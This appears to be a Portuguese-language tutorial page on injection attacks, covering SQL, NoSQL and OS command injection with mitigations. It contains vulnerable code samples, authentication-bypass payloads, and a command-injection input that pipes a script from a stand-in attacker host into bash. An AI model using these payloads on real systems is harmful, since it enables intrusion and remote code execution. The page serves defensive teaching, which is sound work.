O que é Injection?

Injection — SQL, NoSQL, OS Command, LDAP

Dados não confiáveis interpretados como comandos — SQLi, NoSQL, OS Command, LDAP.

Ataques de injeção ocorrem quando dados não confiáveis são enviados para um interpretador (banco de dados, shell, LDAP, XML) como parte de um comando ou query. O atacante quebra o contexto pretendido e faz o interpretador executar comandos arbitrários. É A03 no OWASP Top 10 2021.

SQL Injection (SQLi)

O atacante injeta SQL em campos de entrada para manipular queries ao banco de dados. Pode resultar em vazamento de dados, bypass de autenticação, modificação/deleção de dados e até RCE.

# Query vulnerável:
query = "SELECT * FROM users WHERE username='" + user + "' AND password='" + pwd + "'"

# Input: user = admin'--   pwd = qualquer
# Query resultante: SELECT * FROM users WHERE username='admin'--' AND password='...'
#                                                                ^^
#                                                         comentário SQL — tudo após ignorado
# Retorna usuário admin sem verificar senha!

# Mitigação — Prepared Statement (Python + mysql):
cursor.execute("SELECT * FROM users WHERE username=%s AND password=%s", (user, pwd))

NoSQL Injection

Bancos NoSQL como MongoDB usam operadores diferentes, mas também são vulneráveis quando dados do usuário são inseridos em queries sem sanitização.

MongoDB — Operator Injection

# Requisição normal:
{ "username": "admin", "password": "secret" }

# Payload de bypass (enviar JSON):
{ "username": "admin", "password": { "$ne": null } }
# $ne = not equal → senha diferente de null → sempre verdadeiro

# Também funciona via query string (Express.js):
?username=admin&password[$ne]=x
# Express converte para: { password: { $ne: 'x' } }

Mitigação NoSQLi

  • Validar/sanitizar tipos: rejeitar objetos onde string é esperada
  • Usar ODM (Mongoose) com esquemas tipados
  • Desabilitar operadores desnecessários
  • Sanitizar com bibliotecas como mongo-sanitize

OS Command Injection

Quando a aplicação passa input do usuário para funções de execução de sistema (system(), exec(), popen()), o atacante pode encadear comandos adicionais.

# Código PHP vulnerável:
$output = shell_exec("ping -c 4 " . $_GET['host']);

# Input: 8.8.8.8; curl http://attacker.com/shell.sh | bash
# Executa: ping -c 4 8.8.8.8; curl http://attacker.com/shell.sh | bash

# Mitigação — nunca passar input direto ao shell:
# Python: subprocess com lista (sem shell=True)
subprocess.run(["ping", "-c", "4", host])  # host não pode injetar separadores

Mitigações Gerais

Prepared Statements / Parameterized Queries

A defesa número 1 contra SQLi. Separa código SQL dos dados — o DB nunca interpreta o input como SQL. Disponível em todas as linguagens modernas.

ORM / ODM

Use ORMs (SQLAlchemy, Hibernate, ActiveRecord) que geram queries parametrizadas automaticamente. Cuidado com raw queries dentro do ORM.

Validação de Input rigorosa

Whitelist de caracteres permitidos. Rejeite tipos inesperados. Para OS commands, use APIs de linguagem em vez de chamadas shell.

Princípio do Menor Privilégio

Conta do banco de dados com permissões mínimas. Nunca DBA/root para leitura de dados. Limita impacto de SQLi bem-sucedido.

SQLi ainda aparece em sistemas legados e em ORMs mal utilizados. Ferramentas como sqlmap automatizam a detecção e exploração. Em bug bounty, injeções em parâmetros menos óbvios (headers HTTP, cookies, campos JSON aninhados) são comuns achados. Sempre teste todos os pontos de entrada.

"Separar dados de código é o princípio fundamental que elimina toda a família de ataques de injeção."
